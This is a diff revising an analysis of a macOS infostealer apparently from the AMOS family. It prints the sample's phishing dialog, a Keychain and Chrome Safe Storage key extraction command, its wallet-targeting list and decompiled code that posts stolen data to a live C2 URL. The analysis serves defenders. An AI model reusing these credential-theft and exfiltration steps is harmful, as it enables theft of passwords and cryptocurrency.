@@ -41,17 +41,15 @@ container, the Chromium password databases, and wallet seed phrases.
 
 #### <span style="color:red">GUI phishing prompt</span>
 
-At the very start the sample obtains the macOS account password by showing the
-user a fake authentication window. First it retrieves the username via
-`os.Getenv("USER")` and then checks whether the account is password-protected
+Once a user executes the file, it displays a fake password prompt to obtain the system password.
+Sample retrieves the username via `os.Getenv("USER")` and then checks whether the account is password-protected
 using the `dscl` utility:
 
 ```
 dscl /Local/Default -authonly <user> ""
 ```
 
-If a password is set, a phishing window masquerading as System Preferences is
-displayed.
+If a password is set, a phishing window masquerading as System Preferences appears.
 
 ```applescript
 display dialog "MacOS wants to access System Preferences
@@ -77,7 +75,7 @@ handled by the `main_write` function.
 
 #### <span style="color:red">Keychain</span>
 
-After obtaining the password, the sample attempts to steal the Keychain.
+After obtaining the password, the sample attempts to steal the Keychain. Keychain is a macOS password management system that enables users to safely store sensitive data such as website logins, Wi-Fi passwords, credit card details, and more.
 Physically it is stored in the file `login.keychain-db` in the user's profile
 folder, encrypted with the account password, so the sample copies this file into
 the archive and named it as `login-keychain`:
@@ -87,9 +85,7 @@ the archive and named it as `login-keychain`:
   return main_write(v2, v3, "login-keychain", 14);
 ```
 
-Together with the password, this grants full access to the contents of the
-store: website and application passwords, certificates, authentication tokens,
-and so on.
+Together with the password, this grants full access to the contents of the store.
 
 On systems where the account has no password, a different branch the dialog is not shown and the Keychain container is not copied, instead the
 sample extracts the **Chrome Safe Storage key** from it. This is the key with which
@@ -105,7 +101,7 @@ security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'
 #### <span style="color:red">Cryptocurrency wallets</span>
 
 After the credentials, the sample moves on to collecting cryptocurrency
-wallets. Its targets are Electrum, Coinomi, Exodus, Atomic Wallet and Binance.
+wallets. Its targets are Electrum, Coinomi, Exodus, Atomic Wallet and Binance wallets.
 
 ![alt](wallets_init.png)
 
@@ -114,14 +110,13 @@ directory. It retrieves the name of each file and copies it into the archive und
 
 ![alt](wallet_paths.png)
 
-For Binance only a single specific file, `app-store.json`, is taken. It stores
-session data and account configuration:
+For Binance, the malware targets only a single specific file, app-store.json. It stores session data and account configuration:
 
 ![alt](binance.png)
 
 #### <span style="color:red">Browser data</span>
 
-The sample steals data from Chrome, Brave, Edge, Vivaldi, Yandex, Opera,
+The sample also targets data from Chrome, Brave, Edge, Vivaldi, Yandex, Opera,
 Opera GX and Firefox.
 ![alt](browsers.png)
 
@@ -136,15 +131,16 @@ performed using `filepath.Walk()` with the callback function
 - **Cookies**
 - **Login Data** with saved logins and passwords
 - **Web Data** with autofill data
-- **Local Extension Settings**, the directory holding installed extension data
+- **Local Extension Settings** - the directory containing installed extension data
 
 ![alt](chrome_data.png)
 
 Having found the `Local Extension Settings` directory with the extension data,
-the sample reads its contents and compares the name of each extension against a
+the sample reads its contents and compares directory name against a
 built-in list of 54 crypto extension IDs, copying matches into the archive for
 exfiltration.
 
+List of targeted extensions:
 | Extension ID | Wallet |
 |---|---|
 | acmacodkjbdgmoleebolmdjonilkdbch | Rabby Wallet |
@@ -205,14 +201,13 @@ exfiltration.
 
 **Firefox**
 
-For Firefox it locates and copies the files `cookies.sqlite` and
-`formhistory.sqlite` from `~/Library/Application Support/Firefox/Profiles/`:
+For Firefox it targets `cookies.sqlite` and `formhistory.sqlite` from `~/Library/Application Support/Firefox/Profiles/`:
 
 ![alt](GrabFirefox.png)
 
 #### <span style="color:red">File collection</span>
 
-The sample searches for and copies into the archive files with the extensions
+The sample also targets files with the extensions
 `.txt, .rtf, .key, .wallet, .private, .secret` from the desktop and the
 documents folder.
 
@@ -249,35 +244,31 @@ data_bs64 = encoding_base64__ptr_Encoding_EncodeToString(encoding_base64_URLEnco
 return net_http_PostForm("http://amos-malware.ru/sendlog", 30, &v22);
 ```
 
-Three additional fields are inserted into the request:
+Three fields are inserted into the request:
 
 ```c
 runtime_mapassign_faststr(&RTYPE_net_url_Values, &v22, "BuildID", 7);   // main_buildid
 runtime_mapassign_faststr(&RTYPE_net_url_Values, &v22, "user", 4);      // main_userlog
 runtime_mapassign_faststr(&RTYPE_net_url_Values, &v22, "B64", 3);       // archive in base64
-
+//  ...[snip]...
 return net_http_PostForm("http://amos-malware.ru/sendlog", 30, &v22);
 ```
 
 ![alt](sendlog.png)
 
 The `B64` field contains the entire archive of stolen data. The other two
-fields are populated from global variables:
+fields are filled from global variables:
 
 ```
 _main_buildid   = "UNICEF"
 _main_userlog   = "Holocaust"
 ```
 
-the C2 server was confirmed live. A test POST request received an `HTTP/1.1 200 OK` response from *34.41.139.193* (Google Cloud Platform), served by nginx.
-server-side input checking.
+The C2 server was confirmed live. A test POST request received an `HTTP/1.1 200 OK` response from *34.41.139.193*, served by nginx.
 
 ![alt](burp.png)
 
-After exfiltration, the user is shown a fake application error message. The
-user sees an ordinary launch failure and has no reason to look for outside
-activity. The sample terminates at this point.
-
+After exfiltration, the sample displays a fake application error message. The user sees an ordinary launch failure and has no reason to look for outside activity. The sample terminates at this point.
 
 ![alt](main.png)
 
@@ -286,14 +277,13 @@ activity. The sample terminates at this point.
 
 Based on the combination of the domain name, functional overlap, and
 infrastructure model, the sample is assessed with moderate confidence as
-belonging to the **Atomic macOS Stealer (AMOS)** family or a closely derived
-variant.
+belonging to the **Atomic macOS Stealer (AMOS)** family.
 
 The domain `amos-malware[.]ru` directly references the AMOS brand. The
-collected data categories — Keychain container, Chrome Safe Storage key, browser
+collected data categories - Keychain, Chrome Safe Storage key, browser
 credential databases, cryptocurrency wallet files, and a filegrabber targeting
-the same six extensions — match the publicly documented AMOS capability set
-precisely
+the same six file extensions match the publicly documented AMOS capability set
+precisely.
 
 ### <span class="hl">MITRE ATT&CK</span>
 
